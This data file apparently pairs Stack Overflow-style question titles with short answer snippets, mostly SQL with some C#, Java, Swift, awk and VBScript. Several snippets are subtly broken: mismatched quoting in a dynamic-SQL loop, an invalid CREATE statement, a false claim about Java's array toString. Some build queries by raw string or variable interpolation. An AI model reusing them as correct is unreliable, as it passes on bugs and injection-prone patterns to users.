20173,12740,Can you sort the output of SHOW COLUMNS or DESC?,"SELECT column_name
FROM information_schema.columns
WHERE table_name = 'table_name' ORDER BY column_name
"
22094,43309,Add constraint to unique row with more than 16 columns,"SELECT *
FROM Inserted I 
JOIN BaseTable B ON I.HashValue = B.HashValue AND I.Id<> B.Id 
/* check remaining columns to see if actual differences exist in null safe way  
   http://sqlblog.com/blogs/paul_white/archive/2011/06/22/undocumented-query-plans-equality-comparisons.aspx
  */
  AND EXISTS (SELECT B.Col1, B.Col2 
              INTERSECT
              SELECT I.Col1, I.Col2)
"
24065,32330,SQL concatenation only for selected condition,"select (case when country = 'India' then concat('Local', Emp_name) else Emp_Name end)
"
11500,22276,SQL Server Management Studio ZEROFILL,"SELECT RIGHT('000000' + CONVERT(VARCHAR(6),ID), 6) FROM Table
"
28896,18943,select date+time+timezone with oracle db,"to_char(sysdate, 'YYYY-mm-DD""T""HH24:MI:SS.""0Z""')
"
37509,37296,"Retrieve multiple values from table, bit value and ID","SELECT D.DescID, DJ.DescID, DJ.ProductID, D.ForAll, D.DescTitle, D.DescText 
FROM Brand_Variant_Description D
LEFT JOIN Description_Join DJ ON (D.DescID = DJ.DescID)
WHERE DJ.ProductID=222 OR D.BrandDescAllSel=1
"
1373,1056,Merging rows to columns,"DECLARE @sql1 VARCHAR(1000) = '',
        @sql2 VARCHAR(1000) = '',
        @sql3 VARCHAR(1000) = ''
DECLARE @max INT

SELECT TOP 1 @max = COUNT(*) FROM PersonTest GROUP BY ID ORDER BY COUNT(*) DESC

SELECT @sql1 = 
'SELECT
    ID' + CHAR(10)

SELECT @sql2 = @sql2 +
'   , MAX(CASE WHEN RN =' + CONVERT(VARCHAR(5), RN) 
    + ' THEN name END) AS ' + QUOTENAME('Name' + CONVERT(VARCHAR(5), RN)) + CHAR(10)
FROM(
    SELECT TOP(@max)
        ROW_NUMBER() OVER(ORDER BY (SELECT NULL)) AS RN
    FROM sys.columns
)t
ORDER BY RN

SELECT @sql3 =
'FROM(
    SELECT *,
        RN = ROW_NUMBER() OVER(PARTITION BY ID ORDER BY name)
    FROM PersonTest
)t
GROUP BY ID
ORDER BY ID'

PRINT (@sql1 + @sql2 + @sql3)
EXEC (@sql1 + @sql2 + @sql3)
"
38012,53585,How to select distinct values while using multiple LISTAGG() function in select clause?,"SELECT a.pid,
       LISTAGG(CASE WHEN rc_seqnum = 1 THEN a.rc END, ',') WITHIN GROUP (ORDER BY a.rc) AS race,
       LISTAGG(CASE WHEN cc_seqnum = 1 THEN a.cc END, ',') WITHIN GROUP (ORDER BY a.cc) as chara_codes,
       LISTAGG(CASE WHEN rrc_seqnum = 1 THEN a.rrc END, ',') WITHIN GROUP (ORDER BY a.rrc) AS removal_reason
FROM (SELECT p.person_id as pid, r.race_code as rc, c.characteristic_code as cc,
              rr.removal_reason_code as rrc,
             row_number() over (partition by p.person_id, r.race_code order by r.race_code) as rc_seqnum,
             row_number() over (partition by p.person_id, c.characteristic_code order by c.characteristic_code) as cc_seqnum,
             row_number() over (partition by p.person_id, rr.removal_reason_code order by rr.removal_reason_code) as rrc_seqnum
      FROM person p left outer join race r on p.person_id = r.person_id
           left outer join characteristic c on p.person_id = c.person_id
           left outer join placement_episode pe on p.person_id = pe.child_id
           left outer join removal_reason rr on pe.placement_episode_id = rr.placement_episode_id
     ) a
GROUP BY a.pid;
"
13825,36233,MySQL query with two joins,"SELECT areas.name AS aname, COUNT(consultants.id) AS cct 
FROM areas
    LEFT JOIN consAreas ON consAreas.area = areas.id 
    LEFT JOIN consultants ON consultants.id = consAreas.cons AND consultants.active = 1
WHERE 
    areas.areaID = $area 
GROUP BY areas.id 
ORDER BY areas.name
"
23271,30745,another left join query,"SELECT *
FROM LS_CLIENT_TRANS
LEFT JOIN CLIENT ON LS_CLIENT_TRANS.OTHER_CLIENT = CLIENT.CODE_CLIENT
"
3625,47840,Count rows for each unique combination of columns in SQL,"SELECT DISTINCT ON (cicd9, cdesc) cicd9, cdesc,
  max(posted) OVER w AS last_post,
  count(*) OVER w AS num_posts
FROM dx
WHERE groupid = 'XXX'
WINDOW w AS (
  PARTITION BY cicd9, cdesc
  RANGE BETWEEN UNBOUNDED PRECEDING AND UNBOUNDED FOLLOWING
);
"
30658,67022,How to: select normalized view from denormalized data using CTE?,"select * from Table CROSS APPLY  dbo.split(CommaSepField)
"
21192,71387,how to get Unique data from one table and the other,"JOIN
    conf_log t ON x.date_changed = t.date_changed
    And x.Order_Number = t.Order_number
"
15620,28554,collapsing two columns in one in sql?,"SELECT '(' + convert(varchar, x1) + ',' + convert(varchar, y1) + ')' as ""col""
"
2375,52550,"Postgress ""&"" symbol and number after column name","db=> SELECT 4 & 2 AS bitwise_4_and_2;
 bitwise_4_and_2 
-----------------
               0
(1 row)
"
20968,7374,In Firebird would be a way to auto-update coincident rows in a INSERT procedure?,"UPDATE OR INSERT INTO T1 (F1, F2)
    VALUES (:F1, :F2)
    MATCHING (F1);
"
7091,26682,SQL Select combine text to a selected item?,"SELECT
   A.PractitionerId,
   'http://www.icuro.co.za/WebForms/Members/Appointments/AppointmentView.aspx?id=' + CAST(A.AppointmentId as varchar(50))
FROM
   Appointment AS A WITH (NOLOCK)
"
34036,18997,Oracle Row Level Security in multi-tenant app / default values for new records,"alter table XXX
add column tenant_id default sys_context('tenant_context', 'tenant_id');
"
10267,39188,List table names and columns in relationship,"SELECT t.name AS [TableName]
    ,c.name AS [ColumnName]
    ,CASE WHEN COALESCE(tr.name, tr2.name) IS NULL THEN 'No' 
        ELSE 'Yes' END AS IsColumnInRelation
    ,COALESCE(tr.name, tr2.name) AS [RelatedTable]
    ,COALESCE(cr.name, cr2.name) AS [RelatedColumn] 
    ,CASE WHEN COALESCE(tr.name, tr2.name) IS NOT NULL THEN
        CASE WHEN i.object_id IS NOT NULL THEN 'One'
        ELSE 'Many' END
     END AS RelationKind
    ,COALESCE(f.update_referential_action_desc, f2.update_referential_action_desc) AS [InsertUpdateAction]
    ,COALESCE(f.delete_referential_action_desc, f2.delete_referential_action_desc) AS [DeleteAction]
    ,c.is_nullable AS [IsNull]
    ,p.value AS Description
FROM sys.columns c
    INNER JOIN sys.tables t
        ON t.object_id= c.object_id

    -- Used for the column description.
    LEFT JOIN sys.extended_properties p 
        ON c.object_id = p.major_id
        AND c.column_id = p.minor_id
        AND p.name = 'MS_Description'

    -- Used to identify if this is a primary key.
    -- If it is, then this is on the ""One"" side of the relationship.
    LEFT JOIN  sys.index_columns  ic
        ON ic.object_id = c.object_id 
        AND ic.column_id = c.column_id
    LEFT JOIN sys.indexes  i
        ON ic.object_id = i.object_id 
        AND i.is_primary_key = 1

    -- Used to get the tables and columns that relate to this column.
    LEFT JOIN sys.foreign_key_columns AS fc
        ON c.object_id = fc.parent_object_id
        AND c.column_id = fc.parent_column_id
    LEFT JOIN sys.columns cr
        ON cr.object_id = fc.referenced_object_id
        AND cr.column_id = fc.referenced_column_id
    LEFT JOIN sys.tables tr
        ON cr.object_id = tr.object_id

    -- Used to get the update/delete action for the [fc] relationship.
    LEFT JOIN sys.foreign_keys f
        ON f.object_id = fc.constraint_object_id

    -- Used to get the tables and columns that this column relates to.
    LEFT JOIN sys.foreign_key_columns AS fc2
        ON c.object_id = fc2.referenced_object_id
        AND c.column_id = fc2.referenced_column_id
    LEFT JOIN sys.columns cr2
        ON cr2.object_id = fc2.parent_object_id
        AND cr2.column_id = fc2.parent_column_id
    LEFT JOIN sys.tables tr2
        ON cr2.object_id = tr2.object_id

    -- Used to get the update/delete action for the [fc2] relationship.
    LEFT JOIN sys.foreign_keys f2
        ON f2.object_id = fc2.constraint_object_id
ORDER BY t.name, c.name, COALESCE(tr.name, tr2.name), COALESCE(cr.name, cr2.name)
"
7656,66261,How to extract dates with datatye DATETIME from colum A in table X and put them into Table Y while changing datatype into DATE,"SELECT
  IncidentID
FROM incidents
WHERE ReportingDate >= '20131005'
    AND ReportingDate < '20131006' 
"
30406,48649,SQL command to check Domain Emails,"select substr(e.email, instr(email, '@') + 1) as domain, count(*)
from emails e
group by substr(e.email, instr(email, '@') + 1);
"
22096,33448,Adjust Date to match saved day of week,"declare @baddata table(StartDate datetime, [DayOfWeek] varchar(20))
insert into @baddata values('2010-08-23','Monday')
insert into @baddata values('2010-08-23','Tuesday')
insert into @baddata values('2010-08-29','Thursday')

select * from @baddata

;with Nums as (
    select 0 as n union all select 1 union all select 2 union all select 3 union all select 4 union all select 5 union all select 6
)
update b
set StartDate = DATEADD(day,Nums.n,StartDate)
from
    @baddata b
        inner join
    Nums
        on
            DATENAME(weekday,DATEADD(day,Nums.n,StartDate)) = [DayOfWeek]

select * from @baddata
"
34568,55937,Using While Loop for SQL Server Update,"DECLARE @a INT 
DECLARE @b VARCHAR 
SET @a = 1

WHILE @a < 30
BEGIN
set @b = @a  
exec sp_executesql N'UPDATE source set h = h + 'x_'+@b + N'
           where y_'+@b + N' = ''Sold'''   

SET @a = @a + 1
END
"
12927,29319,"select min value of range [0,44) not in a column","SELECT MIN(value)
FROM (SELECT 0 value UNION SELECT value+1 FROM MyTable) a
WHERE value < 44 AND value NOT IN (SELECT value FROM MyTable)
"
23024,5607,OR Condition when right outer join is used,"Select *  
from RDInfo RD 
left outer join RDCollection RDC  
on (RDC.RDInfoID = RD.RDInfoID and RDC.IsReceived = 1 and RDC.IsRenewed = 0)
"
4722,32176,Only show hours in MYSQL DATEDIFF,"SELECT TIMESTAMPDIFF(HOUR, start_time, end_time) 
           as `difference` FROM timeattendance WHERE timeattendance_id = '1484'
"
39110,33906,SQl queries searching by date range,"SELECT * from Table1 WHERE (CDATE(ColumnDate) BETWEEN #03/26/2010# AND #03/19/2010#)
SELECT * from Table1 WHERE (CINT(ColumnAge) between 25 and 40)
"
26864,48332,SQL Result: Non-empty categories,"SELECT
  Categories.Name,
  ...
FROM
  Categories
  INNER JOIN PartCategories ON PartCategories.CategoryId=Categories.CategoryId
  INNER JOIN Parts ON PartCategories.PartId=Parts.PartId
  INNER JOIN Manufacturers on Parts.ManufacturerId=Manufacturers.ManufacturerId
WHERE
  Manufacturers.ManufacturerId=<your chosen ManufacturerId>
"
22856,52214,How to find the value of an attribute,"protected void GetStringLength(object objDog) {
    // loop through each property in object
    foreach (PropertyInfo pi in objDog.GetType().GetProperties())
    {
        // for each object property, get the SringLength tag (if there is one)
        foreach (Attribute attribute in Attribute.GetCustomAttributes(pi, typeof(StringLengthAttribute), true))
           {
                // we'll assume there is only one 
                var stringLenVal = (attribute as StringLengthAttribute).MaximumLength;
                break;
           }
    }
}
"
28340,37317,SQL Server: GROUP BY datetime without ticks,"select convert(varchar(19), t.date, 120), count(*) as count
from table t
group by convert(varchar(19), t.date, 120) 
having count(*) = 1
order by convert(varchar(19), t.date, 120) 
"
30923,20195,Read a Text/CSV file from an SQL statement,"select emp_record FROM emp_data WHERE emp_no IN (

... Paste contents of file here.

)
"
31032,66300,Select row with most non-key information for each group,"DECLARE @x TABLE
(
  A VARCHAR(32), 
  B VARCHAR(32), 
  C VARCHAR(32), 
  D VARCHAR(32), 
  E VARCHAR(32)
);

INSERT @x VALUES
('Fiona', 'Smith', NULL,   '2152 Cherry Lane',  'CA'),
('Fiona', 'Smith', NULL,   NULL,                NULL),
('Bill',  NULL,    'ACME', '2903 Center Road',  'WA'),
('Bill',  NULL,    'ACME', NULL,                NULL),
(NULL  ,  NULL,    'ABC',  '2300 Water St',     'PA'),
(NULL  ,  NULL,    'ABC',  '2300 Water St',     'PA'),
(NULL  ,  NULL,    NULL,   '3455 B Street',     'CO'),
('Bob',   'Barker',NULL,   NULL,                NULL),
('Bob',   'Barker',NULL,   NULL,                'NY');

;WITH x AS
(
  SELECT A,B,C,D,E, rn = ROW_NUMBER() OVER 
  (
    PARTITION BY A,B,C
    ORDER BY COALESCE(LEN(LEFT(D,1)),0) + COALESCE(LEN(LEFT(E,1)),0) DESC
  )
  FROM @x
)
SELECT A,B,C,D,E
FROM x WHERE rn = 1;
"
3863,40738,find size of text stored in a specific column,"create table t
( a longtext );
insert into t (a) values ('abcdef');

select length(a) from t;
"
24799,18885,How do I write a script to loop through SQL entries an insert values?,"insert into players( person_id, team_id ) as
select id, 6 
from my_first_table
where id >= 100
and id < 140
"
30077,49150,Subselect with not exists in insert into statement,"INSERT INTO S654321.CUSTOMER (KNR, FIRSTNAME, LASTNAME)
SELECT ‘K’ CONCAT CHAR(PNR), FIRSTNAME, LASTNAME
   FROM S654321.PERSON P 
   WHERE NOT EXISTS(SELECT * 
                    FROM S654321.CUSTOMER C 
                    WHERE C.FIRSTNAME = P.FIRSTNAME 
                          AND C.LASTNAME = P.LASTNAME)
"
473,72094,Writing a single query for mutliple where condition using same column same table,"select telco, 
sum(
     case when (msg  like '%fatal%' or out_msg like '%exception%' or out_msg like '%fopen%') and a = '1' 
     then 1 else 0 end 
) as a,
sum(
     case when (msg  like '%fatal%' or out_msg like '%exception%' or out_msg like '%fopen%') and a = '2' 
     then 1 else 0 end 
) as b,
sum(
     case when (msg  like '%fatal%' or out_msg like '%exception%' or out_msg like '%fopen%') and a = '3' 
     then 1 else 0 end 
) as c,
 sum(
     case when (msg not like '%fatal%' or out_msg not like '%exception%' or out_msg not like '%fopen%') and a = '1' 
     then 1 else 0 end 
) as a_e,
sum(
     case when (msg not like '%fatal%' or out_msg not like '%exception%' or out_msg not like '%fopen%') and a = '2' 
     then 1 else 0 end 
) as b_e,
sum(
     case when (msg not like '%fatal%' or out_msg not like '%exception%' or out_msg not like '%fopen%') and a = '3' 
     then 1 else 0 end 
) as c_e

From temp_inbox  group by t
"
9430,63251,Steps to upgrade existing Android database w/o losing data,"class DBHelper extends SQLiteOpenHelper {

    public DBHelper() {
        super(context, DB_NAME, null, DB_VERSION);
        Log.i(TAG, ""DBHelper called with DB_NAME "" + DB_NAME + "" and DB_VERSION "" + Integer.toString(DB_VERSION));
    }

    @Override
    public void onCreate(SQLiteDatabase db) {
        setupV1(db);
        upgradeV2(db);
    }


    @Override
    public void onUpgrade(
            final SQLiteDatabase db, final int oldVersion,
            final int newVersion)
        {
            int upgradeTo = oldVersion + 1;
            Log.i(TAG, ""Upgrading database to version "" + Integer.toString(upgradeTo));
            while (upgradeTo <= newVersion)
            {
                switch (upgradeTo)
                {
                    // Database v2. Added X Functionality
                    case 2:
                        upgradeV2(db);
                        break;
                    // Database v3 (not created yet)
//                      case 3:
//                          // something here
//                          break;
                }
                upgradeTo++;
            }
        }

    private void setupV1(final SQLiteDatabase db) {
        // CODE HERE TO CREATE VERSION / SCHEMA ONE OF MY DATABASE
    }

    private void upgradeV2(final SQLiteDatabase db) {
        // CODE HERE TO UPDATE FROM VERSION ONE TO VERSION TWO
    }

}
"
19268,66483,Oracle 11g: How to merge two result sets,"SELECT
  EXTRACT(MONTH FROM CASES.DATE_ENTERED) AS MONTH_ENTERED,
  COUNT (CASE WHEN SUB_CATEGORY IN('Temp1', 'Temp2', 'Temp3') THEN 1 END) SKILL_COUNT,
  COUNT (CASE WHEN SUB_CATEGORY IN('Call1', 'Call2', 'Call3') THEN 1 END) TRAINING_COUNT
FROM CASES
GROUP BY EXTRACT(MONTH FROM DATE_ENTERED)
ORDER BY MONTH_ENTERED ASC
"
39878,45101,Updating Fields - Realm,"try! Realm().write { 
    var status = Realm().objectForPrimaryKey(aKey) 
    status.statusDA = ""NEW TEXT""
}
"
27391,19393,SQL: Turn the table's columns into rows and performing basic analysis,"CREATE #tempTable (columnName, columnValue)

INSERT INTO #tempTable
SELECT 'A', A
FROM whatever
"
20135,15755,a simple way to sum a result from UNION in MySql,"select id, sum(amount) from (
    select id,amount from table_1 union all
    select id,amount from table_2 union all
    select id,amount from table_3
) x group by id
"
31346,48482,Displaying a default value on table lookup,"SELECT COALESCE(t1.descrition, CONCAT('unknown color(', t1.code, ')'))
AS description 
FROM t1 
LEFT OUTER JOIN description_of_t1_code t2 ON t1.code = t2.code
"
36953,52432,Need help on writing sql select statement,"SELECT sm.*
FROM stock_movement sm
WHERE NOT EXISTS(
    SELECT 'NEXT'
    FROM stock_movement sm2
    WHERE sm2.[Product code] = sm.[Product code]
    AND sm2.date > sm.date
)
"
30729,70170,Using MAX function within a join,"SELECT ipad.udid, ipad.state, max(statelog.new_state)
FROM ipad  
  LEFT OUTER JOIN statelog ON ipad.udid = statelog.udid  
WHERE ipad.airid=250033
GROUP BY ipad.udid, ipad.state
"
1396,63088,"Single query ""radio button"" selection behaviour with UPDATE","UPDATE manganames
SET display =
    CASE WHEN display = 1 then 0
         WHEN name = @name
         ELSE display
    END
WHERE id = @id
"
34708,71630,Access SQL - UPDATE If no record exists,"Update Table1
SET Checkbox = True
WHERE NOT EXISTS(SELECT 1
                 FROM Table2
                 WHERE table1.id=table2.id 
                    OR table1.name=table2.name 
                    or table1.surname=table2.surname)
"
32079,6736,SQL select and count all items that have occured before,"SELECT dt, count(q2.YourDate)
    FROM (SELECT DISTINCT CONVERT(varchar,YourDate,101) dt FROM YourTable) t1
    JOIN YourTable q2 ON DATEADD(d,-1,CONVERT(varchar,YourDate,101)) < dt
    GROUP BY dt
"
17172,8422,Conditional join from different tables,"Select id,index,T.description from items
join (select 1 as id, index, description from Table_A 
UNION select 2 as id, index, description from Table_B) as T
ON items.id=T.id and items.index=T.index
"
39857,37921,Specify order for query manually,"order by date, 
         case operation 
              when 'INCOMING' then 1
              when 'ACCEPT' then 2
              when 'WITHDRAW' then 3
              else 4 -- this is a fallback, anything else will be sorted at the end
         end 
"
3551,46498,SQL payments matrix,"CREATE VIEW NormalizedPayments (id, Year, Month, Amount) AS
SELECT id,
    2010 AS Year,
    1 AS Month,
    2010_01 AS Amount
FROM Payments
UNION ALL
SELECT id,
    2010 AS Year,
    2 AS Month,
    2010_02 AS Amount
FROM Payments
UNION ALL
SELECT id,
    2010 AS Year,
    3 AS Month,
    2010_03 AS Amount
FROM Payments
"
28053,59655,Separate SQL queries per word for dynamic pages?,"SELECT page_title, page_text, page_footer, page_blah 
FROM page_table
WHERE page_id = 123 AND lang = 'FR'
"
18136,9634,sum of value with distinct date sql server,"select actd0v,sum(price0v) from Table_4 group by actd0v      
"
17549,69368,Getting the min and max value from one field in database,"select B.Nome,  max(A.nota) as notaMax, min(A.nota) as notaMin
from table1 A
inner join table2 B  on A.idUC=B.idUC
group by B.Nome
"
4282,51530,Extract specific fields from text file,"#!/usr/bin/awk -f
BEGIN {
    col_list = ""colour shape size"" # continuing with as many as desired for output
    num_cols = split(col_list, cols)
    FS = OFS = "",""
}

NR==1 {
    for (i = 1; i <= NF; i++) {
        p[$i] = i # remember column for name
    }
    # next # enable this line to suppress headers.
}

{
    delim = """"
    for (i = 1; i <= num_cols; i++) {
        printf ""%s%s"", delim, $p[cols[i]]
        delim = OFS
    }
    printf ""\n""
}
"
14691,67940,Linq: How to create One-To-One relationship in program but with historical rows on database,"CREATE VIEW only_most_recent_admissions 
WITH SCHEMABINDING AS
SELECT * 
FROM patient_admissions pa
WHERE pa.admission_date = 
(
    SELECT MAX(pa_sub.admission_date)
    FROM patient_admissions pa_sub
    WHERE pa_sub.patient_id = pa.patient_id
)
"
18312,23946,Best way of selecting 8k+ rows from a table,"-- create the temporary table
CREATE TABLE #CSVData 
(
    IdValue int
)
-- create a clustered index for this table (Note: this doesn't need to be unique)
CREATE CLUSTERED INDEX IX_CSVData on #CSVData (IdValue ) 

-- insert the csv data to the table
BULK INSERT #CSVData
FROM 'c:\csvData.txt'
WITH
(
    ROWTERMINATOR = ','
)

-- select the data 
SELECT T.* 
FROM table_name T
INNER JOIN #CSVData ON(T.uId = IdValue)

-- cleanup (the index will be dropped with the table)
DROP TABLE #CSVData
"
32027,36771,"SQL - GROUPING, ID, NAME","SELECT stops.id, stops.name
FROM route 
INNER JOIN stops on route.stop = stops.id
WHERE route.num = 4 AND route.company = 'LRT'
"
36581,3518,Selectively restoring a database,"RESTORE DATABASE TestDB
    FROM DISK = 'c:\Northwind.bak'
    WITH MOVE 'Northwind' TO 'c:\test\testdb.mdf',
    MOVE 'Northwind_log' TO 'c:\test\testdb.ldf'
"
1222,22849,Generate sum at bottom of results,"'Write header lines
line = ""Report For Week of "" & (dateadd(""d"",-7,sDate)) & """"
objTS.WriteLine line
line = ""State,Data1,Data2""
objTS.WriteLine line

'Write detail lines
Do while not rs.eof
line = rs(0) & dl & rs(1) & dl & rs(2)
objTS.WriteLine line
if rs(1) >= 0 then
    gtpTot = gtpTot + rs(1)
end if
if rs(2) >= 0 then
    gtlTot = gtlTot + rs(2)
end if
rs.movenext
loop

'Output grand totals
line = ""Grand Total,"" & gtpTot & dl & gtlTot
objTS.WriteLine line
"
7447,3534,"What is the difference between ""BETWEEN AND"" and ""> AND <="" on datetime?","... AND CASE WHEN A>0 THEN open_date ELSE close_date END BETWEEN '01/01/2012' AND '05/01/2012'
"
20414,15644,Android - sqlite in clause using values from array,"String values[] = {""23"",""343"",""33"",""55"",""43""};
String inClause = values.toString();

//at this point inClause will look like ""[23,343,33,55,43]""
//replace the brackets with parentheses
inClause = inClause.replace(""["",""("");
inClause = inClause.replace(""]"","")"");

//now inClause will look like  ""(23,343,33,55,43)"" so use it to construct your SELECT
String select = ""select * from table_name where id in "" + inClause;
"
16851,73362,UPDATE based on count,"UPDATE users u
SET    number_of_votes = p.ct
FROM  (
   SELECT users_id, count(*) AS ct
   FROM   poll_records
   WHERE  poll_record_type = 3
   GROUP  BY users_id
   ) p
WHERE    u.users_id = p.users_id
AND      u.number_of_votes IS DISTINCT FROM p.ct;  -- to avoid empty updates
"
7419,47073,How do I get a trailing week count for every day over a given period (on Postgres)?,"select dd.dte,
       sum(cnt) over (order by dd.dte rows between 6 preceding and current date) as avg_7daymoving
from generate_series('2015-01-01'::timestamp, '2015-04-01'::timestamp, '1 day'::interval) dd(dte) left join
     (select date_trunc('day', occurred) as dte, count(*) as cnt
      from events e
      group by date_trunc('day', occurred)
     ) e
     on e.dte = dd.dte
"
35190,60678,rails 3 sql selection current_user.comments (where @comment.article_id = @article.id),"current_user.comments.where(:article_id => params[:article_id])
"
36657,45248,"Relational Algebra union, join and intersect","SELECT DEPTID, CRSNAME
FROM COURSE A
INNER JOIN LECTURERS B on A.DEPTID=B.DEPTID
WHERE B.DEPTID='eENG' or B.DEPTID='CS'
"
4922,44925,Is it always possible to do something in SQL if you could do it in Linq?,"select sum(case when type = 'cash' then Value * Quantity else 0 end) as Cash,
    sum(case when type = 'check' then Value * Quantity else 0 end) as Check
from ...
"
15459,20688,Increment Variable/Counter in PL/SQL Select result,"SELECT ROW_NUMBER() OVER (ORDER BY productname), productname
  FROM tableproduct
  ORDER BY productname
"
17777,33078,Inserting values with a select subquery AND an additional variable,"INSERT INTO approved (fname, lname, student_id, email, type, reason) 
SELECT fname, lname, student_id, email, type, :reason 
FROM waiting WHERE id = :id
"
35721,42056,"Does LENGTH(trim(:NEW.ADDRESS)) trim the "":NEW.ADDRESS"" for the entire script?",":NEW.ADDRESS := trim(:NEW.ADDRESS);
"
37750,8504,SQL Delete with Subquery,"DELETE t1
FROM Table1 t1
inner join 
(
   select col1, col2 
   from other_table 
   where ...
) t2 on  t2.col1 = t1.col1 
     and t2.col2 = t1.col2
"
20971,25449,Oracle SQL Syntax: Quoted identifier,"select * from bar; -- will fail

select * from ""bar""; -- will succeed
"
768,45339,Fetch Table data based on multiple timing referred from other table,"SELECT
    S.id AS scheduleid,
    S.userid,
    S.schedulefrom,
    S.scheduletill,
    UA.id AS availabilityid,
    UA.availablefrom,
    UA.availabletill
FROM
    tbl_schedules AS S
JOIN tbl_useravailability AS UA
    ON S.schedulefrom between  UA.availablefrom and UA.availabletill

WHERE
    UA.userid=1 and s.userid <> 1
"
3880,55001,How to Group same field under one field using sql query,"select * from t
order by CASE WHEN HOD_CODE='P00212' THEN EMP_NO ELSE HOD_CODE END,
         CASE WHEN HOD_CODE='P00212' THEN 0 ELSE 1 END
"
12484,60979,how to find the most common pattern,"declare @temp table (product1 varchar, product2 varchar, user_count int)

insert into @temp (product1, product2, user_count
select pr1.product, pr2.product, count(distinct userid)
from
purchases pr1
inner join purchases pr2 on pr1.UserId = pr2.UserId and pr1.Time < pr2.Time
group by
pr1.product,
pr2.product


select top 10 * from @temp order by user_count desc
"
10181,62448,"oracle equivalent of mysql ifnull (no case, no if)","SELECT COALESCE(columna, columnb, ..., columnz) FROM mytable
"
13561,9941,Check value in rows with same FK,"   SELECT * FROM tableA A1
    WHERE NOT EXISTS 
    ( SELECT 1 from tableA A2
      where A1.order_id= A2.order_id
      and A2.status <> 'COMPLETE'
    ) 
"
6841,34494,Multilingual database - Get all languages of post,"SELECT t.*,
  (SELECT GROUP_CONCAT(l1.name SEPARATOR ',')
    FROM translation t1
    JOIN languages l1 ON l1.id = t1.language_id
    WHERE t1.product_id = t.product_id
    GROUP BY t1.product_id
  ) AS lang_names
FROM translation t
  -- there put required JOIN-s --
  WHERE t.id = ?
"
24141,26799,How can I have my Postgresql SELECT return data from columns with the same name?," SELECT table1.name,
         table1.timetag,
         table1.status,
        table2.timetag AS theothertimetag,
        table2.description

    FROM
"
14211,68479,Drilling down date span with ColdFusion or SQL,"AND dte_vouch_start <= #myDate# AND dte_vouch_expiry >= #myDate#
"
33547,26859,Getting the good row in a MySQL GROUP BY query,"SELECT id, date, movie_id, comment_value FROM comments c JOIN
(SELECT movie_id, MAX(date) date FROM comments GROUP BY movie_id) x
ON x.movie_id=c.movie_id AND x.date=c.date GROUP BY movie_id;
"
14950,1249,Select mutiple rows with max date,"SELECT * FROM evaluari WHERE magazin = 186 AND date = (SELECT MAX(date) from evaluari WHERE magazin = 186)
"
1003,13262,SQL Server 2005 - T-SQL - How to generate int ID?,"CREATE TABLE dbo.YourTable( ID INT IDENTITY(1,1) ......
"
34167,41839,Return only first item from a related group,"SELECT pk,
       a,
       b,
       c,
       d
  FROM( SELECT pk,
               a,
               b,
               c,
               d,
               row_number() over (partition by a order by pk asc) rnk
          FROM your_table )
 WHERE rnk = 1
"
8925,29542,Removing duplicate SQL table rows,"CREATE TABLE t_test (col1 int, col2 int, col3 int, col4 int)

INSERT t_test 
          SELECT 10, 0, 1000, 1 
UNION ALL SELECT 10, 0, 1000, 1 --> should be deleted
UNION ALL SELECT 10, 0, 1111, 2 --> should be deleted
UNION ALL SELECT 10, 1, 1000, 1
UNION ALL SELECT 10, 2, 1000, 1
UNION ALL SELECT 15, 0, 1000, 1
UNION ALL SELECT 15, 0, 1000, 1 --> should be deleted
UNION ALL SELECT 16, 0, 1000, 1

DECLARE @col1 int, @col2 int, @count int

DECLARE delete_loop CURSOR LOCAL STATIC
    FOR SELECT COUNT(*), col1, col2
          FROM t_test
         GROUP BY col1, col2
        HAVING COUNT(*) > 1
OPEN delete_loop
FETCH NEXT FROM delete_loop INTO @count, @col1, @col2
WHILE @@FETCH_STATUS = 0
    BEGIN
        DELETE TOP (@count - 1)
          FROM t_test
         WHERE col1 = @col1
           AND col2 = @col2

        FETCH NEXT FROM delete_loop INTO @count, @col1, @col2
    END
CLOSE delete_loop
DEALLOCATE delete_loop

SELECT * FROM t_test
"
5314,56203,How to Get Count of the Particular records in Oracle?,"SELECT case when Status in ('A','B') 
            then 'A&B'
            else Status
       end AS Status,
       COUNT(Status) AS StatusCount
FROM EMPLOYEE
GROUP BY case when Status in ('A','B') 
              then 'A&B'
              else Status
         end
"
16640,40333,How do I return rows where there is more than one type?,"SELECT DISTINCT user_id FROM table WHERE typecode = 'TypeA' OR typecode = 'TypeB' 
   GROUP BY user_id, typecode HAVING COUNT(typecode) > 1
"
3157,35342,Subtracting the sum of flows on one date from the sum of another date?,"SELECT NAME,
       SUM(CASE WHEN DATE = DATE '2014-12-31' THEN FLOWS END)/1000000.00 AS FLOWS_20141231,
       SUM(CASE WHEN DATE = DATE '2015-10-30' THEN FLOWS END)/1000000.00 AS FLOWS_20151030,
       SUM(CASE WHEN DATE = DATE '2015-10-30' THEN FLOWS
                WHEN DATE = DATE '2014-12-31' THEN - FLOWS
           END)/1000000.00 AS FLOWS_DIFF,
FROM HISTORY_TBL1
WHERE DATE IN (DATE '2015-10-30',  DATE '2014-12-31')
GROUP BY NAME;
"
10559,35876,Getting Count and Rows in same query,"SELECT
    COUNT(*) OVER (),
    (list of your other columns here)
FROM dbo.YourTableNameHere
"
5288,63182,Exracting substring from given string,"SQL> with t as
  2  ( select 'maxo_instr_interface' as txt from dual union all
  3    select 'maxis_vendor_interface' from dual union all
  4    select 'maximos_emps_interface2' from dual
  5  )
  6  select txt
  7       , regexp_substr(txt,'[^_]+',1,2)
  8    from t
  9  /

TXT                     REGEXP_SUBSTR(TXT,'[^_]
----------------------- -----------------------
maxo_instr_interface    instr
maxis_vendor_interface  vendor
maximos_emps_interface2 emps

3 rows selected.
"
22704,64175,Find nearest Number when one of the fields is null but you need a Value,"select *
from
    dbo.Elliott_GensRentalRate as gr cross apply
    (
        select gsp.*, row_number() over
            (order by abs(gr.GenAmps - gsp.GenAmps), sign(gr.GenAmps - gsp.GenAmps)) as rnk
        from dbo.GeneratorSizePrices as gsp
        where gsp.GenVolts = gr.GenVolts
) as gspr /* GeneratorSizePricesRanked */
where gspr.rnk = 1
"
13609,64306,comparing two dates. Equal isn't working as well,"SELECT
    l.*, 
    Format(l.Date, 'h:nn ampm') AS time_component
FROM Logs AS l
WHERE l.Date >= #2015.06.11# AND l.Date < #2015.06.12#;
"
5224,37783,Need if statement to check for null UDF SQL server,"ALTER FUNCTION [dbo].[hmsGetLosText]
   (@FromDt as datetime,@DateLeftOrg as Datetime) 
returns varchar(255)
AS
BEGIN
    DECLARE @yy AS SMALLINT, @mm AS INT, @dd AS INT,
        @getmm as INT, @getdd as INT, @Fvalue varchar(255)

    --if @DateLeftOrg is null, use GetDate
